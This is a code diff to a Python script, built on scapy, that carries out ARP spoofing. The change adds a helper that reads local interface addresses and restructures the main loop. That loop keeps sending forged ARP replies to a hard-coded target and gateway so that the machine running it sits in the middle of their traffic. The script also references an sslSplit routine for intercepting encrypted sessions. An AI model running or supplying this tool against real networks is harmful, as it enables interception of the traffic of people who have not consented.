@@ -5,6 +5,7 @@ import scapy.all as scapy
 import time
 import threading
 import os
+from netaddr import IPAddress
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
@@ -25,6 +26,17 @@ def restore(destination_ip, source_ip):
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
     scapy.send(packet, verbose = False)
+
+def get_local_info():
+    interfaces = netifaces.ifaddresses('wlp3s0')
+    # dictionary
+    normal_internet = interfaces[netifaces.AF_INET][0]
+    address = normal_internet['addr']
+    netmask = normal_internet['netmask']
+    broadcast = normal_internet['broadcast']
+    slash = IPAddress(netmask).netmask_bits()
+    
+    return address, netmask, broadcast, str(slash)
 
 def getDevice(ip):
     request = scapy.ARP()
@@ -52,41 +64,46 @@ def sslSplit():
         time.sleep(2)
     print("[-] sslSplit stopped")
 
-# print(get_mac('192.168.99.100')) 
-getDevice('192.168.99.1/24')
 
-target_ip = "192.168.99.100" # Enter your target IP
-gateway_ip = "192.168.99.1" # Enter your gateway's IP
+if __name__ == '__main__':
 
-# t = threading.Thread(target = sslSplit)
-# t.start()
+    address, netmask, broadcast, slash = get_local_info()
 
-try:
-    sent_packets_count = 0
-    while True:
-        spoof(target_ip, gateway_ip) # cheat on victim to know I am gateway
-        spoof(gateway_ip, target_ip) # cheat on switch to know I am target
-        sent_packets_count = sent_packets_count + 2
-        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
-        time.sleep(2) # Waits for two seconds
-  
-except KeyboardInterrupt:
-    print("\nCtrl + C pressed.............Exiting")
-    restore(gateway_ip, target_ip)
-    restore(target_ip, gateway_ip)
-    print("[-] Arp Spoof Stopped")
-    # t.join()
+    # print(get_mac('192.168.99.100')) 
+    getDevice(address + '/' + slash)
 
-# interface = netifaces.interfaces()[1]
-# print('=============')
-# print('Interface Info')
-# print('=============')
-# print(netifaces.ifaddresses(interface))
-# print(' ')
+    target_ip = "192.168.99.100" # Enter your target IP
+    gateway_ip = "192.168.99.1" # Enter your gateway's IP
 
-# request = scapy.ARP()
-# print('============')
-# print('Request Info')
-# print('============')
-# print(request.summary())
-# print(' ')
+    # t = threading.Thread(target = sslSplit)
+    # t.start()
+
+    try:
+        sent_packets_count = 0
+        while True:
+            spoof(target_ip, gateway_ip) # cheat on victim to know I am gateway
+            spoof(gateway_ip, target_ip) # cheat on switch to know I am target
+            sent_packets_count = sent_packets_count + 2
+            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
+            time.sleep(2) # Waits for two seconds
+    
+    except KeyboardInterrupt:
+        print("\nCtrl + C pressed.............Exiting")
+        restore(gateway_ip, target_ip)
+        restore(target_ip, gateway_ip)
+        print("[-] Arp Spoof Stopped")
+    #     t.join()
+
+    # interface = netifaces.interfaces()[1]
+    # print('=============')
+    # print('Interface Info')
+    # print('=============')
+    # print(netifaces.ifaddresses(interface))
+    # print(' ')
+
+    # request = scapy.ARP()
+    # print('============')
+    # print('Request Info')
+    # print('============')
+    # print(request.summary())
+    # print(' ')
